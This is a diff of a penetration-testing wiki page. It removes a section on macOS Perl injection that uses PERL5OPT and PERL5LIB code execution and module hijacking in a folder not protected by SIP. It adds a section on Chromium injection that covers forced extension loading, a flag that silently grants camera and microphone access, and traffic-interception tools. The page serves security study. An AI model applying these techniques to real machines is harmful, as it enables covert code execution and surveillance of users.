@@ -1,4 +1,4 @@
-# macOS Perl Applications Injection
+# macOS Chromium Injection
 
 <details>
 
@@ -14,77 +14,35 @@ Other ways to support HackTricks:
 
 </details>
 
-## Via `PERL5OPT` & `PERL5LIB` env variable
+## Basic Information
 
-Using the env variable PERL5OPT it's possible to make perl execute arbitrary commands.\
-For example, create this script:
+Chromium-based browsers like Google Chrome, Microsoft Edge, Brave, and others. These browsers are built on the Chromium open-source project, which means they share a common base and, therefore, have similar functionalities and developer options.
 
-{% code title="test.pl" %}
-```perl
-#!/usr/bin/perl
-print "Hello from the Perl script!\n";
-```
-{% endcode %}
+#### `--load-extension` Flag
 
-Now **export the env variable** and execute the **perl** script:
+The `--load-extension` flag is used when starting a Chromium-based browser from the command line or a script. This flag allows to **automatically load one or more extensions** into the browser upon startup.
 
-```bash
-export PERL5OPT='-Mwarnings;system("whoami")'
-perl test.pl # This will execute "whoami"
-```
+#### `--use-fake-ui-for-media-stream` Flag
 
-Another option is to create a Perl module (e.g. `/tmp/pmod.pm`):
+The `--use-fake-ui-for-media-stream` flag is another command-line option that can be used to start Chromium-based browsers. This flag is designed to **bypass the normal user prompts that ask for permission to access media streams from the camera and microphone**. When this flag is used, the browser automatically grants permission to any website or application that requests access to the camera or microphone.
 
-{% code title="/tmp/pmod.pm" %}
-```perl
-#!/usr/bin/perl
-package pmod;
-system('whoami');
-1; # Modules must return a true value
-```
-{% endcode %}
+### Tools
 
-And then use the env variables:
+* [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop)
+* [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO)
+
+### Example
 
 ```bash
-PERL5LIB=/tmp/ PERL5OPT=-Mpmod
+# Intercept traffic
+voodoo intercept -b chrome
 ```
 
-## Via dependencies
-
-It's possible to list the dependencies folder order of Perl running:
-
-```bash
-perl -e 'print join("\n", @INC)'
-```
-
-Which will return something like:
-
-```bash
-/Library/Perl/5.30/darwin-thread-multi-2level
-/Library/Perl/5.30
-/Network/Library/Perl/5.30/darwin-thread-multi-2level
-/Network/Library/Perl/5.30
-/Library/Perl/Updates/5.30.3
-/System/Library/Perl/5.30/darwin-thread-multi-2level
-/System/Library/Perl/5.30
-/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
-/System/Library/Perl/Extras/5.30
-```
-
-Some of the returned folders doesn't even exist, however, **`/Library/Perl/5.30`** does **exist**, it's **not** **protected** by **SIP** and it's **before** the folders **protected by SIP**. Therefore, someone could abuse that folder to add script dependencies in there so a high privilege Perl script will load it.
-
-{% hint style="warning" %}
-However, note that you **need to be root to write in that folder** and nowadays you will get this **TCC prompt**:
-{% endhint %}
-
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>
-
-For example, if a script is importing **`use File::Basename;`** it would be possible to create `/Library/Perl/5.30/File/Basename.pm` to make it execute arbitrary code.
+Find more examples in the tools links
 
 ## References
 
-* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
+* [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
 
 <details>
 
